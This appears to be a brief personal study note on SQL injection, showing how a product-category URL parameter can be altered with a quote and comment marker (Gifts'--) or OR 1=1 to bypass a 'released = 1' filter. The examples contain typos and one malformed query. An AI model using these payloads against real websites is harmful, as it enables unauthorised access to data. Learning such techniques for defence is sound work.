# SQL Injection

* `'`. `OR 1=1`, `OR 1=2`
* `WHERE` and `SELECT` are the most common. 

```
https://example.com/products?category=Gifts

SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
Note: `released = 1` is to show only the released products. `released = 0` is to show all products including unleased products. 

This code include a comment indicator `--`. It comments out anything after. As a result, all products will be displayed. 
```
https://insecure-website.com/products?category=Gifts'--

SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```
This also returns all products.
```

SELECT * FROM products WHERE category = 'Gifts' OR 1=1` AND released = 1
```
